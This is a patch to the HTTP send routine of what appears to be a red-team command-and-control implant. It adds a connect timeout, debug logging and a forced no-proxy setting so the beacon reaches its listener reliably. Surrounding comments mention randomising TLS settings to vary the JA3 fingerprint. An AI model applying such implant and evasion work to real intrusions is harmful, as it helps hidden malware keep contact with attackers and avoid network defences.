@@ -253,6 +253,20 @@ BOOL HttpSend(
         }
         HTTP_LOG( "WinHttpOpen OK" );
 
+        /* Set a bounded connect timeout so WinHttpSendRequest does not block
+         * indefinitely on unreachable hosts or stalled proxy auto-detection.
+         * 15 s is long enough for lab/WAN use but short enough that the retry
+         * loop can cycle multiple times within the 60 s check-in window. */
+        {
+            DWORD ConnTimeoutMs = 15000;
+            Instance->Win32.WinHttpSetOption(
+                Instance->hHttpSession,
+                WINHTTP_OPTION_CONNECT_TIMEOUT,
+                &ConnTimeoutMs,
+                sizeof( DWORD )
+            );
+        }
+
         /* ARC-06: apply the randomly chosen TLS protocol-version set to the
          * fresh session so Schannel advertises a different cipher-suite list
          * in the ClientHello, producing a distinct JA3 hash. */
@@ -326,6 +340,7 @@ BOOL HttpSend(
     }
 
     /* Add our headers */
+    HTTP_LOG( "headers enter" );
     do {
         HttpHeader = Instance->Config.Transport.Headers[ Iterator ];
 
@@ -338,6 +353,7 @@ BOOL HttpSend(
 
         Iterator++;
     } while ( TRUE );
+    HTTP_LOG( "headers done" );
 
     if ( Instance->Config.Transport.Proxy.Enabled ) {
 
@@ -489,6 +505,18 @@ BOOL HttpSend(
         if ( ! Instance->Win32.WinHttpSetOption( Request, WINHTTP_OPTION_PROXY, Instance->ProxyForUrl, Instance->SizeOfProxyForUrl ) ) {
             PRINTF_DONT_SEND( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
         }
+    } else if ( ! Instance->Config.Transport.Proxy.Enabled ) {
+        /* Explicitly set WINHTTP_ACCESS_TYPE_NO_PROXY on this request handle.
+         * The session was opened with NO_PROXY, but WinHTTP may still perform
+         * internal WPAD/PAC auto-detection on the first WinHttpSendRequest when
+         * the system has "Automatically detect settings" enabled.  A per-request
+         * NO_PROXY override prevents that pre-TCP blocking (red-cell-c2-vudj9). */
+        WINHTTP_PROXY_INFO DirectProxy = { 0 };
+        DirectProxy.dwAccessType    = WINHTTP_ACCESS_TYPE_NO_PROXY;
+        DirectProxy.lpszProxy       = WINHTTP_NO_PROXY_NAME;
+        DirectProxy.lpszProxyBypass = WINHTTP_NO_PROXY_BYPASS;
+        HTTP_LOG( "set request NO_PROXY" );
+        Instance->Win32.WinHttpSetOption( Request, WINHTTP_OPTION_PROXY, &DirectProxy, sizeof( WINHTTP_PROXY_INFO ) );
     }
 
     /* Send package to our listener */
